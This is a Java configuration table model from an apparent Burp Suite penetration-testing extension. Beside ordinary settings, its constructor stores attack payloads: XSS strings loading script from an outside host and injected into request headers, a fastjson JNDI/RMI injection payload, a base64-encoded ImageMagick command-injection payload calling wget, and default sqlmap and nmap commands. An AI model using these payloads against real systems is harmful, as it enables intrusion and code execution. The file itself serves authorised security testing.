package config;

import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import javax.swing.table.AbstractTableModel;

import burp.BurpExtender;
import burp.Utils;


public class ConfigTableModel extends AbstractTableModel{
	//https://stackoverflow.com/questions/11553426/error-in-getrowcount-on-defaulttablemodel
	//when use DefaultTableModel, getRowCount encounter NullPointerException. why?
	/**
	 * LineTableModel中数据如果类型不匹配，或者有其他问题，可能导致图形界面加载异常！
	 */
	private static final long serialVersionUID = 1L;
	private List<ConfigEntry> configEntries =new ArrayList<ConfigEntry>();
	private static final String[] titles = new String[] {
			"Key", "Value", "Type", "Enable", "Comment"
	};
	
	public static final String Firefox_Mac = "/Applications/Firefox.app/Contents/MacOS/firefox";
	public static final String Firefox_Windows = "D:\\Program Files\\Mozilla Firefox\\firefox.exe";
	
	// /usr/local/bin 本地默认可执行文件路径
	public static final String SQLMap_Command = "python /usr/local/bin/sqlmap-dev/sqlmap.py -r {request.txt} --force-ssl --risk=3 --level=3";
	public static final String Nmap_Command = "nmap -Pn -sT -sV --min-rtt-timeout 1ms "
			+ "--max-rtt-timeout 1000ms --max-retries 0 --max-scan-delay 0 --min-rate 3000 {host}";
	
	public ConfigTableModel(){
		configEntries.add(new ConfigEntry("Put_MenuItems_In_One_Menu", "",ConfigEntry.Config_Basic_Variable,false,false,"合并所有右键菜单"));

		//用于指示是否自动加载burp suite的项目配置文件,需要指示Json文件路径,需要支持相对路径,直接在knife下去寻找
		configEntries.add(new ConfigEntry("Auto_Load_Project_Config_On_Startup", "Project.Config.json",ConfigEntry.Config_Basic_Variable,true,false,"高级配置：启动时自动加载项目配置"));
		configEntries.add(new ConfigEntry("Scope_Set_Base_On_Wildcard_SubDomain", "",ConfigEntry.Config_Basic_Variable,true,false,"高级配置：设置Scope时基于子域名操作"));
		configEntries.add(new ConfigEntry("Auto_Save_Config_After_Update_Scope", "",ConfigEntry.Config_Basic_Variable,true,false,"高级配置：自动保存Scope更新到项目配置"));

		//默认不添加到scope的域名 //需要优化,不能每次都添加
		String defaultExcludeHosts = ".*\\.baidu\\.com,.*\\.bdstatic\\.com,.*\\.msn\\.cn,.*\\.microsoft\\.com,.*\\.bing\\.com,.*\\.google\\.com,.*\\.firefox\\.com";
		configEntries.add(new ConfigEntry("Auto_Append_Hosts_To_Exclude_Scope",defaultExcludeHosts,ConfigEntry.Config_Basic_Variable,false,false,"高级配置：正则 启动时将主机追加到排除Scope"));

		//流量过滤配置 //需要优化, 默认应该开启+函数处理逻辑应该优化
		configEntries.add(new ConfigEntry("DismissedTargets", "{}",ConfigEntry.Config_Basic_Variable,true,false,"请求处理：前缀|正则 {\".*\\.firefox\\.com\":\"Drop\",\".*\\.mozilla\\.com\":\"Drop\"}"));

		//用于指示当前burp显示编码的环境变量,一般是GBK,UTF-8,关闭时使用burp启动时指定的编码.
		configEntries.add(new ConfigEntry("Display_Coding", "UTF-8",ConfigEntry.Config_Basic_Variable,false,false,"响应编码：显示编码 GBK|GB2312|UTF-8等"));
		configEntries.add(new ConfigEntry("Coding_Set_From", "GBK,UTF-8",ConfigEntry.Config_Basic_Variable,true,false,"响应编码：编码来源 GBK,GB2312,UTF-8,GB18030,Big5,Big5-HKSCS,UNICODE,ISO-8859-1"));
		configEntries.add(new ConfigEntry("Coding_Set_Using", "GBK,UTF-8",ConfigEntry.Config_Basic_Variable,true,false,"响应编码：编码目标 GBK,GB2312,UTF-8,GB18030,Big5,Big5-HKSCS,UNICODE,ISO-8859-1"));

		//自动化处理一些常用的属性
		configEntries.add(new ConfigEntry("AddRespHeaderByReqMethod", "{\"OPTIONS\":\"Content-Type: application/octet-stream\"}",ConfigEntry.Config_Basic_Variable,true,false,"修改响应：方法名 基于请求方法添加响应头"));
		configEntries.add(new ConfigEntry("AddRespHeaderByReqURL", "{\"picture\":\"Content-Type: application/octet-stream\"}",ConfigEntry.Config_Basic_Variable,false,false,"修改响应：关键字|正则 基于请求URL添加响应头"));
		configEntries.add(new ConfigEntry("AddRespHeaderByRespHeader", "{\"application/json\":\"Content-Type: text/html;charset=utf-8\"}",ConfigEntry.Config_Basic_Variable,false,false,"修改响应：关键字|正则 基于响应头添加响应头"));

		configEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,true,false,"修改请求：自动移除Last-Modified头"));
		configEntries.add(new ConfigEntry("If-Modified-Since", "",ConfigEntry.Action_Remove_From_Headers,true,false,"修改请求：自动移除If-Modified-Since头"));
		configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true,false,"修改请求：自动移除If-None-Match头"));

		//运行外部程序的配置
		if (Utils.isMac()) {
			configEntries.add(new ConfigEntry("browserPath", Firefox_Mac,ConfigEntry.Config_Basic_Variable,true,false,"程序调用：指定浏览器路径"));
		}else {
			configEntries.add(new ConfigEntry("browserPath", Firefox_Windows,ConfigEntry.Config_Basic_Variable,true,false,"程序调用：指定浏览器路径"));
		}
		if (Utils.isMac()){//Mac中，通过脚本执行的也会有命令历史记录，使用这种方式最好
			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,false,false,"命令输入：机器输入 影响sqlmap和nmap"));
		}else {
			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,true,false,"命令输入：机器输入 影响sqlmap和nmap"));
		}
		configEntries.add(new ConfigEntry("SQLMap-Command",SQLMap_Command,ConfigEntry.Config_Basic_Variable,true,false,"程序调用：SQL调用命令"));
		configEntries.add(new ConfigEntry("Nmap-Command",Nmap_Command,ConfigEntry.Config_Basic_Variable,true,false,"程序调用：Nmap调用命令"));

		//Chunked set
		configEntries.add(new ConfigEntry("Chunked-AutoEnable", "",ConfigEntry.Config_Chunked_Variable,false,false,"分块配置：功能开关"));
		configEntries.add(new ConfigEntry("Chunked-Length", "10",ConfigEntry.Config_Chunked_Variable,true,false,"分块配置：分块长度"));
		configEntries.add(new ConfigEntry("Chunked-UseComment", "",ConfigEntry.Config_Chunked_Variable,true,false,"分块配置：使用批注"));

		//代理扫描配置 未测试过
		configEntries.add(new ConfigEntry("Proxy-ServerList", "127.0.0.1:8888;127.0.0.1:9999;",ConfigEntry.Config_Proxy_Variable,false,false,"代理访问：上游代理列表"));
		configEntries.add(new ConfigEntry("Proxy-UseRandomMode", "",ConfigEntry.Config_Proxy_Variable,true,false,"代理访问：随机使用上游代理"));

		//cookie功能的配置
		configEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true,false,"基本属性：常见认证头"));
		configEntries.add(new ConfigEntry("DNSlogServer", "bit.0y0.link",ConfigEntry.Config_Basic_Variable,false,false,"基本属性：DNSLog域名"));

		//payload 设置
		configEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Add_Or_Replace_Header,false));
		configEntries.add(new ConfigEntry("XSS-Payload", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Config_Basic_Variable,false,false));
		configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Action_Add_Or_Replace_Header,false));
		//避免IP:port的切分操作，把Payload破坏，所以使用不带分号的简洁Payload
		configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Append_To_header_value,false));
		configEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%host.fastjson.%dnslogserver/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,false));
		configEntries.add(new ConfigEntry("Imagemagick","cHVzaCBncmFwaGljLWNvbnRleHQNCnZpZXdib3ggMCAwIDY0MCA0ODANCmltYWdlIG92ZXIgMCwwIDAsMCAnaHR0cHM6Ly9pbWFnZW1hZ2ljLmJpdC4weTAubGluay94LnBocD94PWB3Z2V0IC1PLSAlcyA+IC9kZXYvbnVsbGAnDQpwb3AgZ3JhcGhpYy1jb250ZXh0",ConfigEntry.Config_Custom_Payload_Base64,false));
	}


	public List<String> getConfigJsons(){
		List<String> result = new ArrayList<String>();
		for(ConfigEntry line:configEntries) {
			String linetext = line.ToJson();
			result.add(linetext);
		}
		return result;
	}


	public List<ConfigEntry> getConfigByType(String type) {

		List<ConfigEntry> result = new ArrayList<ConfigEntry>();
		for (ConfigEntry entry:configEntries) {
			if (entry.getType().equals(type) && entry.isEnable()) {
				result.add(entry);
			}
		}
		return result;
	}


	public String getConfigValueByKey(String key) {
		for (ConfigEntry entry:configEntries) {
			if (entry.getKey().equals(key) && entry.isEnable()) {
				return entry.getValue();
			}
		}
		return null;
	}

	public String getConfigTypeByKey(String key) {
		for (ConfigEntry entry:configEntries) {
			if (entry.getKey().equals(key) && entry.isEnable()) {
				return entry.getType();
			}
		}
		return null;
	}

	public Set<String> getConfigValueSetByKey(String key) {
		Set<String> result = new HashSet<>();
		for (ConfigEntry entry:configEntries) {
			if (entry.getKey().equals(key) && entry.isEnable()) {
				String tmp = entry.getValue().trim();
				if (!tmp.equals("")){
					String[] tmpArray = tmp.split(",");
					for (String url:tmpArray){
						result.add(url.trim());
					}
					//result.addAll(Arrays.asList(tmpArray));
				}
			}
		}
		return result;
	}

	public void setConfigByKey(String key,String value) {
		for (ConfigEntry entry:configEntries) {
			if (entry.getKey().equals(key)) {
				int index = configEntries.indexOf(entry);
				entry.setValue(value);
				configEntries.set(index,entry);
				fireTableRowsUpdated(index,index);
			}
		}
	}


	public void setConfigValueSetByKey(String key,Set<String> vauleSet) {
		for (ConfigEntry entry:configEntries) {
			if (entry.getKey().equals(key)) {
				int index = configEntries.indexOf(entry);

				String valueStr = vauleSet.toString();
				valueStr = valueStr.replace("[", "");
				valueStr = valueStr.replace("]", "");
				valueStr = valueStr.replaceAll(" ","");

				entry.setValue(valueStr);
				configEntries.set(index,entry);
				fireTableRowsUpdated(index,index);
			}
		}
	}

	////////////////////// extend AbstractTableModel////////////////////////////////

	@Override
	public int getColumnCount()
	{
		return titles.length;
	}

	@Override
	public Class<?> getColumnClass(int columnIndex)
	{	switch(columnIndex) 
		{
		case 3: 
			return boolean.class;//enable
		default:
			return String.class;
		}

	}

	@Override
	public int getRowCount()
	{
		return configEntries.size();
	}

	//define header of table???
	@Override
	public String getColumnName(int columnIndex) {
		if (columnIndex >= 0 && columnIndex <= titles.length) {
			return titles[columnIndex];
		}else {
			return "";
		}
	}

	@Override
	public boolean isCellEditable(int rowIndex, int columnIndex) {
		ConfigEntry entry = configEntries.get(rowIndex);
		if (!entry.isEditable()) {
			if (columnIndex ==0 ||columnIndex ==2) {
				//name--0; type---2
				return false;
			}
		}
		return true;
	}

	@Override
	public Object getValueAt(int rowIndex, int columnIndex)
	{
		ConfigEntry entry = configEntries.get(rowIndex);
		switch (columnIndex)
		{
		case 0:
			return entry.getKey();
		case 1:
			return entry.getValue();
		case 2:
			return entry.getType();
		case 3:
			return entry.isEnable();
		case 4:
			return entry.getComment();
		default:
			return "";
		}
	}


	/*
	 * Don't need to implement this method unless your table's
	 * data can change.
	 */
	@Override
	public void setValueAt(Object value, int row, int col) {
		ConfigEntry entry = configEntries.get(row);
		switch (col)
		{
		case 0:
			entry.setKey((String) value);
			break;
		case 1:
			entry.setValue((String) value);
			break;
		case 2:
			entry.setType((String) value);
			break;
		case 3://当显示true/false的时候，实质是字符串，需要转换。当使用勾选框的时候就是boolen
			//			if (((String)value).equals("true")) {
			//				entry.setEnable(true);
			//			}else {
			//				entry.setEnable(false);
			//			}
			entry.setEnable((boolean)value);
			break;
		case 4:
			entry.setComment((String) value);
			break;
		default:
			break;
		}
		fireTableCellUpdated(row, col);
	}

	//////////////////////extend AbstractTableModel////////////////////////////////

	public void addNewConfigEntry(ConfigEntry lineEntry){
		PrintWriter stdout = new PrintWriter(BurpExtender.callbacks.getStdout(), true);
		synchronized (configEntries) {
			configEntries.add(lineEntry);
			int row = configEntries.size();
			//fireTableRowsInserted(row, row);
			//need to use row-1 when add setRowSorter to table. why??
			//https://stackoverflow.com/questions/6165060/after-adding-a-tablerowsorter-adding-values-to-model-cause-java-lang-indexoutofb
			//fireTableRowsInserted(row-1, row-1);
			fireTableRowsInserted(row-2, row-2);
		}
	}

	public void removeRows(int[] rows) {
		PrintWriter stdout1 = new PrintWriter(BurpExtender.callbacks.getStdout(), true);
		synchronized (configEntries) {
			//because thread let the delete action not in order, so we must loop in here.
			//list length and index changed after every remove.the origin index not point to right item any more.
			Arrays.sort(rows); //升序
			for (int i=rows.length-1;i>=0 ;i-- ) {//降序删除才能正确删除每个元素
				ConfigEntry config = configEntries.get(rows[i]);
				String key = config.getKey();
				updateConflictItem(key);//如果存在冲突值，更新
				
				configEntries.remove(rows[i]);
				stdout1.println("!!! "+key+" deleted");
				this.fireTableRowsDeleted(rows[i], rows[i]);
			}
		}

	}
	
	public void updateConflictItem(String key) {
		for (ConfigEntry item:configEntries){
			String keytmp = item.getKey();
			if (keytmp.equalsIgnoreCase(key+"[Conflict]")) {
				int index = configEntries.indexOf(item);
				item.setKey(key);
				this.fireTableRowsUpdated(index, index);
			}
		}
	}


	public void updateRows(int[] rows) {
		synchronized (configEntries) {
			//because thread let the delete action not in order, so we must loop in here.
			//list length and index changed after every remove.the origin index not point to right item any more.
			Arrays.sort(rows); //升序
			for (int i=rows.length-1;i>=0 ;i-- ) {//降序删除才能正确删除每个元素
				ConfigEntry checked = configEntries.get(rows[i]);
				configEntries.remove(rows[i]);
				configEntries.add(rows[i], checked);
			}
			this.fireTableRowsUpdated(rows[0], rows[rows.length-1]);
		}
	}

	public List<ConfigEntry> getConfigEntries() {
		return configEntries;
	}


	public void setConfigEntries(List<ConfigEntry> configEntries) {
		this.configEntries = configEntries;
	}
}